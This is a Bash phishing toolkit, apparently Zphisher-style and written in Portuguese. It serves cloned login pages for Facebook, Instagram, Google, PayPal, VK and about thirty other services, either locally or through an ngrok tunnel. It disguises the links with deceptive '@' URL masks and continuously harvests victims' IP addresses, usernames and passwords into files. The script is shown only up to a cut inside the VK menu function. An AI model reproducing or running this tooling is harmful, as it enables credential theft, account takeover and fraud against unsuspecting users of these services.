#Copyright (C) 2021 YgoR-SX9W
RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  
GREENBG="$(printf '\033[42m')"  
ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  
CYANBG="$(printf '\033[46m')"  
WHITEBG="$(printf '\033[47m')" 
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${CYAN}[${WHITE}!${CYAN}]${CYAN} Programa interrompido." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${CYAN}[${WHITE}!${CYAN}]${CYAN} Programa encerrado.." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
	tput sgr0   
	tput op     
    return
}

xxx.YgoR() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi	
}

banner() {
	cat <<- EOF

 ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE} ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}   ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}    ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE} 
${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE}     ${CYAN}:${WHITE}+${CYAN}:${WHITE}         ${CYAN}:${WHITE}+${CYAN}:${WHITE}     ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} 
+${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+ +${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+     +${CYAN}:${WHITE}+         +${CYAN}:${WHITE}+     +${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+ +${CYAN}:${WHITE}+         +${CYAN}:${WHITE}+  +${CYAN}:${WHITE}+  
+#+    +${CYAN}:${WHITE}+ +#++${CYAN}:${WHITE}++#+      +#+         +#+     +#+    +${CYAN}:${WHITE}+ +#++${CYAN}:${WHITE}++#++   +#++${CYAN}:${WHITE}+   
+#+    +#+ +#+    +#+     +#+         +#+     +#+    +#+        +#+  +#+  +#+  
#+#    #+# #+#    #+#     #+#         #+#     #+#    #+# #+#    #+# #+#    #+# 
 ########  #########  ###########     ###      ########   ########  ###    ### 
 


${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄

	${CYAN}[${WHITE}01${CYAN}]${WHITE} Facebook      ${CYAN}[${WHITE}11${CYAN}]${WHITE} Twitch       ${CYAN}[${WHITE}21${CYAN}]${WHITE} DeviantArt
		${CYAN}[${WHITE}02${CYAN}]${WHITE} Instagram     ${CYAN}[${WHITE}12${CYAN}]${WHITE} Pinterest    ${CYAN}[${WHITE}22${CYAN}]${WHITE} Badoo
		${CYAN}[${WHITE}03${CYAN}]${WHITE} Google        ${CYAN}[${WHITE}13${CYAN}]${WHITE} Snapchat     ${CYAN}[${WHITE}23${CYAN}]${WHITE} Origin
		${CYAN}[${WHITE}04${CYAN}]${WHITE} Microsoft     ${CYAN}[${WHITE}14${CYAN}]${WHITE} Linkedin     ${CYAN}[${WHITE}24${CYAN}]${WHITE} DropBox	
		${CYAN}[${WHITE}05${CYAN}]${WHITE} Netflix       ${CYAN}[${WHITE}15${CYAN}]${WHITE} Ebay         ${CYAN}[${WHITE}25${CYAN}]${WHITE} Yahoo		
		${CYAN}[${WHITE}06${CYAN}]${WHITE} Paypal        ${CYAN}[${WHITE}16${CYAN}]${WHITE} Quora        ${CYAN}[${WHITE}26${CYAN}]${WHITE} Wordpress
		${CYAN}[${WHITE}07${CYAN}]${WHITE} Steam         ${CYAN}[${WHITE}17${CYAN}]${WHITE} Protonmail   ${CYAN}[${WHITE}27${CYAN}]${WHITE} Yandex			
		${CYAN}[${WHITE}08${CYAN}]${WHITE} Twitter       ${CYAN}[${WHITE}18${CYAN}]${WHITE} Spotify      ${CYAN}[${WHITE}28${CYAN}]${WHITE} StackoverFlow
		${CYAN}[${WHITE}09${CYAN}]${WHITE} Playstation   ${CYAN}[${WHITE}19${CYAN}]${WHITE} Reddit       ${CYAN}[${WHITE}29${CYAN}]${WHITE} Vk
		${CYAN}[${WHITE}10${CYAN}]${WHITE} Tiktok        ${CYAN}[${WHITE}20${CYAN}]${WHITE} Adobe        ${CYAN}[${WHITE}30${CYAN}]${WHITE} XBOX
		${CYAN}[${WHITE}31${CYAN}]${WHITE} Mediafire     ${CYAN}[${WHITE}32${CYAN}]${WHITE} Gitlab       ${CYAN}[${WHITE}33${CYAN}]${WHITE} Github
                                                                                                
${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄
${WHITE}                      ${CYAN}Copyright (C) 2021 YgoR-SX9W
		           
	${CYAN}[${WHITE}-${CYAN}]${WHITE} Criador ObitoISX
		${CYAN}[${WHITE}-${CYAN}]${WHITE} CANAL NO YOTUBE:
		${CYAN}[${WHITE}-${CYAN}]${WHITE} https://youtube.com/channel/UC9xk9e3rw2loNaBBUdL94cQ
	EOF
}

logoYgoR() {
	cat <<- EOF
 ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE} ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}   ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}    ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE} 
${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE}     ${CYAN}:${WHITE}+${CYAN}:${WHITE}         ${CYAN}:${WHITE}+${CYAN}:${WHITE}     ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} 
+${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+ +${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+     +${CYAN}:${WHITE}+         +${CYAN}:${WHITE}+     +${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+ +${CYAN}:${WHITE}+         +${CYAN}:${WHITE}+  +${CYAN}:${WHITE}+  
+#+    +${CYAN}:${WHITE}+ +#++${CYAN}:${WHITE}++#+      +#+         +#+     +#+    +${CYAN}:${WHITE}+ +#++${CYAN}:${WHITE}++#++   +#++${CYAN}:${WHITE}+   
+#+    +#+ +#+    +#+     +#+         +#+     +#+    +#+        +#+  +#+  +#+  
#+#    #+# #+#    #+#     #+#         #+#     #+#    #+# #+#    #+# #+#    #+# 
 ########  #########  ###########     ###      ########   ########  ###    ### 
 
	EOF
}

instalar_pacotes() {
	echo -e "\n${CYAN}[${WHITE}+${CYAN}]${WHITE} Instalando os pacotes necessários..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${CYAN}[${WHITE}+${CYAN}]${CYAN} Instalando o pacote: ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${CYAN}[${WHITE}+${CYAN}]${WHITE} Pacotes já instalados.."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${CYAN}[${WHITE}+${CYAN}]${CYAN} Instalando o pacote : ${WHITE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Gerenciador de pacotes não suportados, instalar pacotes manualmente."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Ocorreu um erro, instale o Ngrok manualmente."
		{ reset_color; exit 1; }
	fi
}

SX9W_NgroK() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${CYAN}[${WHITE}+${CYAN}]${WHITE} Ngrok já instalado."
	else
		echo -e "\n${CYAN}[${WHITE}+${CYAN}]${WHITE} Instalando ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

sair() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Obrigado por usar esta ferramenta. Tenha um bom dia..${RESETBG}\n"
	{ reset_color; exit 0; }
}


info() {
clear
	{ clear; echo; }
	cat <<- EOF
 ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE} ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}   ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}  ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE}    ${CYAN}:${WHITE}${CYAN}:${WHITE}${CYAN}:${WHITE} 
${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE}     ${CYAN}:${WHITE}+${CYAN}:${WHITE}         ${CYAN}:${WHITE}+${CYAN}:${WHITE}     ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} ${CYAN}:${WHITE}+${CYAN}:${WHITE}    ${CYAN}:${WHITE}+${CYAN}:${WHITE} 
+${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+ +${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+     +${CYAN}:${WHITE}+         +${CYAN}:${WHITE}+     +${CYAN}:${WHITE}+    +${CYAN}:${WHITE}+ +${CYAN}:${WHITE}+         +${CYAN}:${WHITE}+  +${CYAN}:${WHITE}+  
+#+    +${CYAN}:${WHITE}+ +#++${CYAN}:${WHITE}++#+      +#+         +#+     +#+    +${CYAN}:${WHITE}+ +#++${CYAN}:${WHITE}++#++   +#++${CYAN}:${WHITE}+   
+#+    +#+ +#+    +#+     +#+         +#+     +#+    +#+        +#+  +#+  +#+  
#+#    #+# #+#    #+#     #+#         #+#     #+#    #+# #+#    #+# #+#    #+# 
 ########  #########  ###########     ###      ########   ########  ###    ### 
 


		${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄
     
     ${WHITEBG}${CYAN}Copyright (C) 2021 YgoR-SX9W${RESETBG}
     ${CYAN}BLACK HELL TEAM
     
${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄${CYAN}▀${WHITE}▄

		${CYAN}[${WHITE}00${CYAN}]${WHITE} Voutar     ${CYAN}[${WHITE}99${CYAN}]${WHITE} Sair

	EOF
	read -p "${CYAN}[${WHITE}-${CYAN}]${CYAN} Selecione uma opção ${WHITE}≫ : ${BLUE}"

	if [[ "$REPLY" == 99 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Voltando ao menu principal..."
		{ sleep 1; Sx9W-info; }
	else
		echo -ne "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Opção inválida, tente novamente..."
		{ sleep 1; info; }
	fi
}

HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Configurando o servidor..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Iniciando servidor PHP..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE}  IP da Vitima${CYAN} ≫  ${WHITE}$IP"
	echo -ne "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} salvo em${CYAN} ≫   ${WHITE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Conta${CYAN} ≫  ${WHITE} $ACCOUNT"
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} senha${CYAN} ≫  ${WHITE} $PASSWORD"
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} salvo em${CYAN} ≫ ${WHITE}sx9w.txt"
	cat .server/www/usernames.txt >>usernames.dat
	echo -ne "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Aguardando a próxima informação de login, ${CYAN}Ctrl + C ${WHITE}Para sair . "
}

capture_data() {
	echo -ne "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Aguardando informações de login, ${CYAN}Ctrl + C ${WHITE}Para sair..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${CYAN}[${WHITE}-${CYAN}]${CYAN} IP encontrado !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Informação de login encontrada !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

start_ngrok() {
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Inicializando... ${CYAN}( ${CYAN}http://$HOST:$PORT ${CYAN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Lançamento do Ngrok.."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; logoYgoR; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} URL 1 : ${CYAN}$ngrok_url"
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} URL 2 : ${CYAN}$mask@$ngrok_url1"
	capture_data
}

start_localhost() {
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; logoYgoR; }
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${WHITE} Hospedado com sucesso : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

menuWeb() {
	{ clear; logoYgoR; }
	cat <<- EOF

		${CYAN}[${WHITE}01${CYAN}]${WHITE} REDE LOCAL ${CYAN}[${WHITE}Local${CYAN}]
		${CYAN}[${WHITE}02${CYAN}]${WHITE} PARA WEB  ${CYAN} [${WHITE}WEB${CYAN}]

	EOF

	read -p "${CYAN}[${WHITE}-${CYAN}]${WHITE} Selecione um serviço de encaminhamento de porta : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok
	else
		echo -ne "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Opção inválida, tente novamente.."
		{ sleep 1; menuWeb; }
	fi
}

site_facebook() {
	cat <<- EOF

		${CYAN}[${WHITE}01${CYAN}]${WHITE} Página de login tradicional
		${CYAN}[${WHITE}02${CYAN}]${WHITE} Página de login avançada
		${CYAN}[${WHITE}03${CYAN}]${WHITE} Página de login de segurança falsa
		${CYAN}[${WHITE}04${CYAN}]${WHITE} Página de login do Facebook Messenger

	EOF

	read -p "${CYAN}[${WHITE}-${CYAN}]${WHITE} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://facebook'
		menuWeb
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_advanced"
		mask='http://social-media'
		menuWeb
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_security"
		mask='http://facebook'
		menuWeb
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="fb_messenger"
		mask='http://facebook'
		menuWeb
	else
		echo -ne "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Opção inválida, tente novamente..."
		{ sleep 1; clear; logoYgoR; site_facebook; }
	fi
}

site_instagram() {
	cat <<- EOF

		${CYAN}[${WHITE}01${CYAN}]${WHITE} Página de login tradicional
		${CYAN}[${WHITE}02${CYAN}]${WHITE} Página de login de seguidores automáticos
		${CYAN}[${WHITE}03${CYAN}]${WHITE} Página de login de 1000 seguidores
		${CYAN}[${WHITE}04${CYAN}]${WHITE} Crachá azul Verificar página de login
	EOF

	read -p "${CYAN}[${WHITE}-${CYAN}]${WHITE} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://-instagram'
		menuWeb
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://instagram'
		menuWeb
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="insta_followers"
		mask='http://-instagram'
		menuWeb
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="ig_verify"
		mask='http://instagram'
		menuWeb
	else
		echo -ne "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Opção inválida, tente novamente..."
		{ sleep 1; clear; logoYgoR; site_instagram; }
	fi
}

site_gmail() {
	cat <<- EOF

		${CYAN}[${WHITE}01${CYAN}]${WHITE} Pagina de loguin 1
		${CYAN}[${WHITE}02${CYAN}]${WHITE} Pagina de loguin 2

	EOF

	read -p "${CYAN}[${WHITE}-${CYAN}]${WHITE} Selecione uma opção:: ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://google-drive'
		menuWeb
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://google-drive'
		menuWeb
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="google_poll"
		mask='http://google-driver'
		menuWeb
	else
		echo -ne "\n${CYAN}[${WHITE}!${CYAN}]${CYAN} Opção invalida ,Escolha  outra  . . ."
		{ sleep 1; clear; logoYgoR; site_gmail; }
	fi
}

site_vk() {
	cat <<- EOF

		${CYAN}[${WHITE}01${CYAN}]${ORANGE} Página de login tradicional
		${CYAN}[${WHITE}02${CYAN}]${ORANGE} Página de login avançada

	EOF

	read -p "${CYAN}[${WHITE}-${CYAN}]${WHITE} selecione uma  opção  : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="vk"
		mask='http://vk'
		menuWeb
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="vk_poll"
		mask='http://conta-vk'
		menuWeb
	else
